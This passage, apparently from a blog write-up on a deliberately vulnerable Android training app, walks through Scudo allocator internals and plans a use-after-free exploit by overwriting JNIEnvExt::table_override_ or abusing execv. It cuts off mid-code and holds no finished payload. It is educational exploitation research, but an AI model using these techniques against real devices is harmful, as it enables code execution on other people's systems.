    0x0000730eb408fda3 &lt;+3&gt;:	push   rax
    0x0000730eb408fda4 &lt;+4&gt;:	mov    r14,rdi
    0x0000730eb408fda7 &lt;+7&gt;:	mov    rax,QWORD PTR [rip+0x982a2]  # 0x730eb4128050 &lt;__libc_globals+80&gt;
    0x0000730eb408fdae &lt;+14&gt;:	test   rax,rax
    0x0000730eb408fdb1 &lt;+17&gt;:	jne    0x730eb408fdcb &lt;malloc+43&gt;
    0x0000730eb408fdb3 &lt;+19&gt;:	call   0x730eb40950f0 &lt;scudo_malloc&gt;
    0x0000730eb408fdb8 &lt;+24&gt;:	mov    rbx,rax
    0x0000730eb408fdbb &lt;+27&gt;:	test   rax,rax
    0x0000730eb408fdbe &lt;+30&gt;:	je     0x730eb408fdd0 &lt;malloc+48&gt;
    0x0000730eb408fdc0 &lt;+32&gt;:	mov    rax,rbx
    0x0000730eb408fdc3 &lt;+35&gt;:	add    rsp,0x8
    0x0000730eb408fdc7 &lt;+39&gt;:	pop    rbx
    0x0000730eb408fdc8 &lt;+40&gt;:	pop    r14
    0x0000730eb408fdca &lt;+42&gt;:	ret    
    0x0000730eb408fdcb &lt;+43&gt;:	call   QWORD PTR [rax+0x18]

[4] gef➤  p/x 0x982a2 + 0x0000730eb408fdae
    $1 = 0x730eb4128050
gef➤  x/1gx 0x730eb4128050
    0x730eb4128050 &lt;__libc_globals+80&gt;:	0x0000000000000000

[5] gef➤  disassemble scudo_malloc
Dump of assembler code for function scudo_malloc:
   0x0000730eb40950f0 &lt;+0&gt;:	push   rbx
   0x0000730eb40950f1 &lt;+1&gt;:	mov    rsi,rdi
   0x0000730eb40950f4 &lt;+4&gt;:	lea    rdi,[rip+0x9b5c5]        # 0x730eb41306c0 &lt;_ZL9Allocator&gt;
   0x0000730eb40950fb &lt;+11&gt;:	mov    ecx,0x10
   0x0000730eb4095100 &lt;+16&gt;:	xor    edx,edx
   0x0000730eb4095102 &lt;+18&gt;:	xor    r8d,r8d
   0x0000730eb4095105 &lt;+21&gt;:	call   0x730eb4094a20 &lt;_ZN5scudo9AllocatorINS_13AndroidConfigEXadL_Z21scudo_malloc_postinitEEE8allocateEmNS_5Chunk6OriginEmb&gt;
   0x0000730eb409510a &lt;+26&gt;:	mov    rbx,rax
   0x0000730eb409510d &lt;+29&gt;:	test   rax,rax
   0x0000730eb4095110 &lt;+32&gt;:	je     0x730eb4095117 &lt;scudo_malloc+39&gt;
   0x0000730eb4095112 &lt;+34&gt;:	mov    rax,rbx
   0x0000730eb4095115 &lt;+37&gt;:	pop    rbx
   0x0000730eb4095116 &lt;+38&gt;:	ret    
   0x0000730eb4095117 &lt;+39&gt;:	call   0x730eb411a850 &lt;__errno@plt&gt;
   0x0000730eb409511c &lt;+44&gt;:	mov    DWORD PTR [rax],0xc
   0x0000730eb4095122 &lt;+50&gt;:	mov    rax,rbx
   0x0000730eb4095125 &lt;+53&gt;:	pop    rbx
   0x0000730eb4095126 &lt;+54&gt;:	ret    
</code></pre><p>Lets digest what we just witnessed:</p><ol><li>Identifying the values of <code>ptrList</code> and <code>keyValuePair</code> and confirming that <code>ptrList = keyValuePair</code></li><li>Checking where <code>ptrList</code> and <code>keyValuePair</code> point to. They are pointing to some <em>primary</em> location?</li><li>As we called <code>malloc</code> to allocate memory, we quickly check its disassembly and observe that there is a call to <code>scudo_malloc</code> in case there is a zero at <code>rip + 0x982a2 = 0x0000730eb408fdae + 0x982a2</code>.</li><li>Verify that indeed <code>scudo_malloc</code> is called. Btw. if <code>rip + 0x982a2</code> pointed to a global memory region that is writable, we might be able to introduce our own, totally benign implementation of <code>malloc</code>.</li><li>Check implementation of <code>scudo_malloc</code>. It internally calls <code>scudo::Allocator&lt;...>::allocate</code> (using <a href=https://man7.org/linux/man-pages/man1/c++filt.1.html target=_blank rel=noopener><em>c++filt</em></a>
to demangle mangled names).</li></ol><p>We can observe a similar behaviour for <code>free</code>, which winds up to call <code>scudo::Allocator&lt;scudo::AndroidConfig, &(scudo_malloc_postinit)>::deallocate(void*, scudo::Chunk::Origin, unsigned long, unsigned long)</code>.</p><h4 id=introducing-scudo-the-allocator>Introducing <em>Scudo</em>, the Allocator</h4><p><a href=https://source.android.com/docs/security/test/scudo target=_blank rel=noopener><em>Scudo</em></a>
is an allocator that is used for all native code from Android 11 onwards. Its source code can be found <a href=https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/ target=_blank rel=noopener>here</a>
.</p><p>We are going to take a practical approach, i.e. hunt down the functionality as quickly as possible to verify that <code>ptrList = keyValuePair</code> was not a coincidence. To that end, I will only present small excerpts of code.</p><p>As seen <a href=#the-bug>above</a>
, <code>scudo_malloc</code> calls <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=292" target=_blank rel=noopener><code>scudo::Allocator&lt;...>::allocate(unsigned long, scudo::Chunk::Origin, unsigned long, bool)</code></a>
. Analyzing the implementation reveals:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>LIKELY</span><span class=p>(</span><span class=n>PrimaryT</span><span class=o>::</span><span class=n>canAllocate</span><span class=p>(</span><span class=n>NeededSize</span><span class=p>)))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=p>...</span>
</span></span><span class=line><span class=cl>  <span class=n>Block</span> <span class=o>=</span> <span class=n>TSD</span><span class=o>-&gt;</span><span class=n>Cache</span><span class=p>.</span><span class=n>allocate</span><span class=p>(</span><span class=n>ClassId</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>...</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=o>*</span><span class=n>Ptr</span> <span class=o>=</span> <span class=k>reinterpret_cast</span><span class=o>&lt;</span><span class=kt>void</span> <span class=o>*&gt;</span><span class=p>(</span><span class=n>UserPtr</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=o>*</span><span class=n>TaggedPtr</span> <span class=o>=</span> <span class=n>Ptr</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=k>return</span> <span class=n>TaggetPtr</span><span class=p>;</span>
</span></span></code></pre></div><p><code>Ptr</code> is computed from <code>Block</code>, but that is irrelevant for now. Tracing <code>TSD->Cache.allocate(ClassId)</code> gets us to the <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=70" target=_blank rel=noopener>implementation</a>
we wanted to see:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=kt>void</span> <span class=o>*</span><span class=nf>allocate</span><span class=p>(</span><span class=n>uptr</span> <span class=n>ClassId</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=p>...</span>
</span></span><span class=line><span class=cl>  <span class=n>PerClass</span> <span class=o>*</span><span class=n>C</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>PerClassArray</span><span class=p>[</span><span class=n>ClassId</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=p>...</span>
</span></span><span class=line><span class=cl>  <span class=n>CompactPtrT</span> <span class=n>CompactP</span> <span class=o>=</span> <span class=n>C</span><span class=o>-&gt;</span><span class=n>Chunks</span><span class=p>[</span><span class=o>--</span><span class=n>C</span><span class=o>-&gt;</span><span class=n>Count</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=p>...</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>Allocator</span><span class=o>-&gt;</span><span class=n>decompactPtr</span><span class=p>(</span><span class=n>ClassId</span><span class=p>,</span> <span class=n>CompactP</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Reversing the type definitions shows that <code>CompactPtrT = uintptr_t</code>, so its just a normal pointer. Finally, inspecting <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=135" target=_blank rel=noopener><code>PerClass</code></a>
:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=k>struct</span> <span class=nc>PerClass</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>u32</span> <span class=n>Count</span><span class=p>;</span>    <span class=c1>// &lt;-- amount of free chunks in block
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>u32</span> <span class=n>MaxCount</span><span class=p>;</span> <span class=c1>// &lt;-- no idea
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>uptr</span> <span class=n>ClassSize</span><span class=p>;</span> <span class=c1>// &lt;-- size of a single chunk in bytes
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>CompactPtrT</span> <span class=n>Chunks</span><span class=p>[</span><span class=mi>2</span> <span class=o>*</span> <span class=n>TransferBatch</span><span class=o>::</span><span class=n>MaxNumCached</span><span class=p>];</span>  <span class=c1>// &lt;-- chunks, freed and used
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>};</span>
</span></span></code></pre></div><p>Basically <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=70" target=_blank rel=noopener><code>SizeClassAllocatorLocalCache::allocate(uptr ClassId)</code></a>
will get the next free chunk by decreasing <code>PerClass::Count</code> by 1 and taking this as an index into <code>PerClass::Chunks</code>.</p><p>Similarly, for <code>scudo_free</code>, we end up running <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=88" target=_blank rel=noopener><code>SizeClassAllocatorLocalCache::deallocate(uptr ClassId, void *P)</code></a>
(this is non - trivial to see, but is what actually happens):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=kt>void</span> <span class=nf>deallocate</span><span class=p>(</span><span class=n>uptr</span> <span class=n>ClassId</span><span class=p>,</span> <span class=kt>void</span> <span class=o>*</span><span class=n>P</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=p>...</span>
</span></span><span class=line><span class=cl>  <span class=n>PerClass</span> <span class=o>*</span><span class=n>C</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>PerClassArray</span><span class=p>[</span><span class=n>ClassId</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=p>...</span>
</span></span><span class=line><span class=cl>  <span class=n>C</span><span class=o>-&gt;</span><span class=n>Chunks</span><span class=p>[</span><span class=n>C</span><span class=o>-&gt;</span><span class=n>Count</span><span class=o>++</span><span class=p>]</span> <span class=o>=</span> <span class=n>Allocator</span><span class=o>-&gt;</span><span class=n>compactPtr</span><span class=p>(</span><span class=n>ClassId</span><span class=p>,</span> <span class=k>reinterpret_cast</span><span class=o>&lt;</span><span class=n>uptr</span><span class=o>&gt;</span><span class=p>(</span><span class=n>P</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=p>...</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>This method frees a chunk by writing the compacted pointer back into the array and adding 1 to <code>PerClass::Count</code>. Therefore, the sequence</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>manager</span> <span class=o>*</span><span class=n>m</span> <span class=o>=</span> <span class=p>(</span><span class=k>struct</span> <span class=n>manager</span><span class=o>*</span><span class=p>)</span><span class=nf>malloc</span><span class=p>(</span><span class=k>sizeof</span><span class=p>(</span><span class=k>struct</span> <span class=n>manager</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=nf>free</span><span class=p>(</span><span class=n>m</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>object</span> <span class=o>*</span><span class=n>obj</span> <span class=o>=</span> <span class=p>(</span><span class=k>struct</span> <span class=n>object</span><span class=o>*</span><span class=p>)</span><span class=nf>malloc</span><span class=p>(</span><span class=k>sizeof</span><span class=p>(</span><span class=k>struct</span> <span class=n>object</span><span class=p>));</span>
</span></span></code></pre></div><p>results in decrementing <code>PerClass::Count</code> (w.r.t. corresponding class id), incrementing it and then decrementing it again while writing the same pointer. This is why we get that <code>ptrList = keyValuePair</code>. Notice that there are probably optimizations in place that handle memory shortages etc. As <em>DamnVulnerableApp</em> is the only app I run on the emulator, it might differ from what you get on a busy device.</p><h3 id=trying-to-exploit>Trying to exploit</h3><p>Lets recall the setting we are in:</p><ol><li>We are given a <em>Write - What - Where</em> condition, which allows us to write anywhere we want. It is possible to write code and data, but notice that all writable memory regions (<code>.bss</code>, <code>.data</code>, <code>stack</code>, <code>heap</code>) are <strong>not</strong> executable.</li><li>We have access to <code>libart.so</code>, <code>libUseAfterFreeWriteModule.so</code>, the stack and the canary.</li></ol><p>The <em>Goal</em>: Arbitrary Code Execution</p><h4 id=sniffing-out-function-pointers>Sniffing out function pointers</h4><p>The first idea is to find a sequence of function calls, for which we have suitable control over the parameters. Redirecting the pointers of those functions by e.g. overwriting the <em>vtable</em> would allow to execute arbitrary functions that are <em>resistent</em> to <code>__thiscall</code>. This basically means that those functions do not use the first parameter at all or use it in a way that is beneficial to us.</p><p>Unfortunately, <em>vtables</em> are located in a read - only section. This can be proven by observing that mangled <em>vtable</em> names start with &ldquo;_ZTV&rdquo;. To be precise, only <a href=https://itanium-cxx-abi.github.io/cxx-abi/abi-mangling.html target=_blank rel=noopener>&ldquo;TV&rdquo;</a>
indicates that this is a <em>vtable</em>. Next, analysing all publicly available <em>vtables</em>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ readelf --wide --symbols libart.so <span class=p>|</span> grep <span class=s2>&#34;_ZTV&#34;</span>
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl> 13121: 0000000000c17e18    <span class=m>32</span> OBJECT  WEAK   PROTECTED   <span class=m>16</span> _ZTVN3art32BuildNativeCallFrameStateMachineINS_26ComputeNativeCallFrameSizeEEE
</span></span><span class=line><span class=cl>$ readelf --wide --sections libart.so
</span></span><span class=line><span class=cl>  ...
</span></span><span class=line><span class=cl>  <span class=o>[</span>16<span class=o>]</span> .data.rel.ro      PROGBITS        0000000000c0aa40 80aa40 010b00 <span class=m>00</span>  WA  <span class=m>0</span>   <span class=m>0</span> <span class=m>16</span>
</span></span><span class=line><span class=cl>  ...
</span></span></code></pre></div><p>Note that I might have missed a <em>vtable</em>, but this was enough to quit persuing the <em>vtable</em> - approach. If we were able to call <code>mprotect</code> on the <em>vtables</em>, maybe it could be possible to make the <em>vtables</em> writable. Although for this to work, we would need to find a function call that provides a virtual function with the exact parameters we need for <code>mprotect</code>. Therefore, <code>__thiscall</code> is again a challenge.</p><p>Luckily, there are other, globally available objects that contain important function pointers. This time, the target will be to abuse the sequence of <code>JNIEnv</code> - function calls in a JNI function.</p><p>Observe that, if a JNI method is called (in this module), it will be called via a generic trampoline, i.e. via <code>artQuickGenericJniTrampoline</code> in assembly in <code>art_quick_generic_jni_trampoline</code>. The first parameter is <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:art/runtime/entrypoints/quick/quick_trampoline_entrypoints.cc;l=1936;drc=1e6140afcea4c0f4bd9480bcca29e7939a3999c9" target=_blank rel=noopener>ALWAYS</a>
of type <code>JNIEnv*</code>. The jni object is fetched via <code>Thread::GetJniEnv</code>, which returns an instance of <code>JNIEnvExt</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=k>class</span> <span class=nc>JniEnvExt</span> <span class=o>:</span> <span class=k>public</span> <span class=n>JNIEnv</span> <span class=p>{...}</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=cp>#if defined(__cplusplus)
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=k>typedef</span> <span class=n>_JNIEnv</span> <span class=n>JNIEnv</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=cp>#else
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=k>typedef</span> <span class=k>const</span> <span class=k>struct</span> <span class=nc>JNINativeInterface</span><span class=o>*</span> <span class=n>JNIEnv</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=cp>#endif
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm> * C++ object wrapper.
</span></span></span><span class=line><span class=cl><span class=cm> *
</span></span></span><span class=line><span class=cl><span class=cm> * This is usually overlaid on a C struct whose first element is a
</span></span></span><span class=line><span class=cl><span class=cm> * JNINativeInterface*.  We rely somewhat on compiler behavior.
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=nc>_JNIEnv</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=cm>/* do not rename this; it does not seem to be entirely opaque */</span>
</span></span><span class=line><span class=cl>    <span class=k>const</span> <span class=k>struct</span> <span class=nc>JNINativeInterface</span><span class=o>*</span> <span class=n>functions</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>...</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>The definition of <code>_JNIEnv</code> comes from <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:libnativehelper/include_jni/jni.h;drc=1e6140afcea4c0f4bd9480bcca29e7939a3999c9;l=489" target=_blank rel=noopener>here</a>
. In structures, everything is public, therefore <code>functions</code> is visible in <code>JNIEnvExt</code>!</p><p>Then also observe that (see <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:art/runtime/jni/jni_env_ext.h;l=165" target=_blank rel=noopener>code</a>
)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c++ data-lang=c++><span class=line><span class=cl><span class=k>class</span> <span class=nc>JNIEnvExt</span> <span class=o>:</span> <span class=k>public</span> <span class=n>JNIEnv</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=p>...</span>
</span></span><span class=line><span class=cl>    <span class=k>static</span> <span class=k>const</span> <span class=n>JNINativeInterface</span><span class=o>*</span> <span class=n>table_override_</span> <span class=p>...;</span>
</span></span><span class=line><span class=cl>    <span class=p>...</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Using</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ readelf --wide --symbols libart.so <span class=p>|</span> grep <span class=s2>&#34;_ZN3art9JNIEnvExt15table_override_E&#34;</span>
</span></span><span class=line><span class=cl> 3674: 0000000000e21cb8     <span class=m>8</span> OBJECT  GLOBAL PROTECTED   <span class=m>23</span> _ZN3art9JNIEnvExt15table_override_E
</span></span><span class=line><span class=cl>10840: 0000000000e21cb8     <span class=m>8</span> OBJECT  GLOBAL PROTECTED   <span class=m>23</span> _ZN3art9JNIEnvExt15table_override_E
</span></span><span class=line><span class=cl>$ readelf --wide --sections libart.so <span class=p>|</span> grep .bss
</span></span><span class=line><span class=cl>  <span class=o>[</span>23<span class=o>]</span> .bss              NOBITS          0000000000e1fbe0 81fbe0 003bb0 <span class=m>00</span>  WA  <span class=m>0</span>   <span class=m>0</span> <span class=m>16</span>
</span></span></code></pre></div><p>yields that <code>JNIEnvExt::table_override</code> is part of <code>.bss</code>, which again implies that we can overwrite this pointer with the <em>Write - What - Where</em> condition.</p><p>We can try to link both of the above together via <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:art/runtime/jni/jni_env_ext.cc;drc=1e6140afcea4c0f4bd9480bcca29e7939a3999c9;bpv=0;bpt=1;l=318" target=_blank rel=noopener><code>GetFunctionTable</code></a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=k>const</span> <span class=n>JNINativeInterface</span><span class=o>*</span> <span class=n>JNIEnvExt</span><span class=o>::</span><span class=n>GetFunctionTable</span><span class=p>(</span><span class=kt>bool</span> <span class=n>check_jni</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>const</span> <span class=n>JNINativeInterface</span><span class=o>*</span> <span class=k>override</span> <span class=o>=</span> <span class=n>JNIEnvExt</span><span class=o>::</span><span class=n>table_override_</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=k>override</span> <span class=o>!=</span> <span class=k>nullptr</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=k>override</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>check_jni</span> <span class=o>?</span> <span class=n>GetCheckJniNativeInterface</span><span class=p>()</span> <span class=o>:</span> <span class=n>GetJniNativeInterface</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>and either <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:art/runtime/jni/jni_env_ext.cc;l=293;bpv=0;bpt=1" target=_blank rel=noopener><code>ThreadResetFunctionTable</code></a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=kt>void</span> <span class=nf>ThreadResetFunctionTable</span><span class=p>(</span><span class=n>Thread</span><span class=o>*</span> <span class=kr>thread</span><span class=p>,</span> <span class=kt>void</span><span class=o>*</span> <span class=n>arg</span> <span class=n>ATTRIBUTE_UNUSED</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>REQUIRES</span><span class=p>(</span><span class=n>Locks</span><span class=o>::</span><span class=n>jni_function_table_lock_</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>JNIEnvExt</span><span class=o>*</span> <span class=n>env</span> <span class=o>=</span> <span class=kr>thread</span><span class=o>-&gt;</span><span class=n>GetJniEnv</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=kt>bool</span> <span class=n>check_jni</span> <span class=o>=</span> <span class=n>env</span><span class=o>-&gt;</span><span class=n>IsCheckJniEnabled</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=n>env</span><span class=o>-&gt;</span><span class=n>functions</span> <span class=o>=</span> <span class=n>JNIEnvExt</span><span class=o>::</span><span class=n>GetFunctionTable</span><span class=p>(</span><span class=n>check_jni</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>env</span><span class=o>-&gt;</span><span class=n>unchecked_functions_</span> <span class=o>=</span> <span class=n>GetJniNativeInterface</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>or <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:art/runtime/jni/jni_env_ext.cc;l=118" target=_blank rel=noopener><code>SetCheckJniEnabled</code></a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=kt>void</span> <span class=n>JNIEnvExt</span><span class=o>::</span><span class=n>SetCheckJniEnabled</span><span class=p>(</span><span class=kt>bool</span> <span class=n>enabled</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>check_jni_</span> <span class=o>=</span> <span class=n>enabled</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>MutexLock</span> <span class=nf>mu</span><span class=p>(</span><span class=n>Thread</span><span class=o>::</span><span class=n>Current</span><span class=p>(),</span> <span class=o>*</span><span class=n>Locks</span><span class=o>::</span><span class=n>jni_function_table_lock_</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>functions</span> <span class=o>=</span> <span class=n>GetFunctionTable</span><span class=p>(</span><span class=n>enabled</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=c1>// Check whether this is a no-op because of override.
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=k>if</span> <span class=p>(</span><span class=n>enabled</span> <span class=o>&amp;&amp;</span> <span class=n>JNIEnvExt</span><span class=o>::</span><span class=n>table_override_</span> <span class=o>!=</span> <span class=k>nullptr</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>LOG</span><span class=p>(</span><span class=n>WARNING</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;Enabling CheckJNI after a JNIEnv function table override is not functional.&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>So if either of the above functions was called with a modified <code>JNIEnvExt::override_table_</code>, then the ART would overwrite the function table for all function calls performed via the first argument in a JNI function with pointers that we can control. An idea might be to redirect the function pointers to fitting gadgets&mldr;</p><p>Notice that <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:art/runtime/jni/jni_env_ext.cc;l=293;bpv=0;bpt=1" target=_blank rel=noopener><code>ThreadResetFunctionTable</code></a>
is a callback invoked inside a <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:art/runtime/jni/jni_env_ext.cc;l=301" target=_blank rel=noopener><code>foreach</code> - method</a>
, i.e.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=kt>void</span> <span class=n>JNIEnvExt</span><span class=o>::</span><span class=n>SetTableOverride</span><span class=p>(</span><span class=k>const</span> <span class=n>JNINativeInterface</span><span class=o>*</span> <span class=n>table_override</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>MutexLock</span> <span class=nf>mu</span><span class=p>(</span><span class=n>Thread</span><span class=o>::</span><span class=n>Current</span><span class=p>(),</span> <span class=o>*</span><span class=n>Locks</span><span class=o>::</span><span class=n>thread_list_lock_</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>MutexLock</span> <span class=nf>mu2</span><span class=p>(</span><span class=n>Thread</span><span class=o>::</span><span class=n>Current</span><span class=p>(),</span> <span class=o>*</span><span class=n>Locks</span><span class=o>::</span><span class=n>jni_function_table_lock_</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>JNIEnvExt</span><span class=o>::</span><span class=n>table_override_</span> <span class=o>=</span> <span class=n>table_override</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=c1>// See if we have a runtime. Note: we cannot run other code (like JavaVMExt&#39;s CheckJNI install
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=c1>// code), as we&#39;d have to recursively lock the mutex.
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>Runtime</span><span class=o>*</span> <span class=n>runtime</span> <span class=o>=</span> <span class=n>Runtime</span><span class=o>::</span><span class=n>Current</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>runtime</span> <span class=o>!=</span> <span class=k>nullptr</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>runtime</span><span class=o>-&gt;</span><span class=n>GetThreadList</span><span class=p>()</span><span class=o>-&gt;</span><span class=n>ForEach</span><span class=p>(</span><span class=n>ThreadResetFunctionTable</span><span class=p>,</span> <span class=k>nullptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Core Platform API checks rely on stack walking and classifying the caller. If a table
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// override is installed do not try to guess what semantics should be.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>runtime</span><span class=o>-&gt;</span><span class=n>SetCorePlatformApiEnforcementPolicy</span><span class=p>(</span><span class=n>hiddenapi</span><span class=o>::</span><span class=n>EnforcementPolicy</span><span class=o>::</span><span class=n>kDisabled</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>which seems to be free of any references to <code>this</code>. Calling this function would update the function tables of every thread, which is the optimal thing to have. The big problem is that there needs to be a thread that can execute this function without crashing. If a thread crashed and took down the entire app, we would not be able to get code execution, because the JNI function would not be called. So we need a thread that is &ldquo;crash - resistent&rdquo;&mldr; Also, in order to create a copy of that function pointer table, we would need to write at least <code>sizeof (struct JNINativeInterface) = 0x748 bytes</code>, i.e. roughly half a page. The probability to break the app by overwriting global variables to this extent can be assumed to be very high.</p><h4 id=alternative-idea-for-exploitation-of-useafterfreewritemodule>Alternative idea for exploitation of <em>UseAfterFreeWriteModule</em></h4><p>There is a symbol called <code>execv</code> in the symbol table of <code>libart.so</code>, whose value is <code>0</code>. Thus there is a <code>.plt</code> entry for this function. According to an experiment, the following code runs without an error in the emulator:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
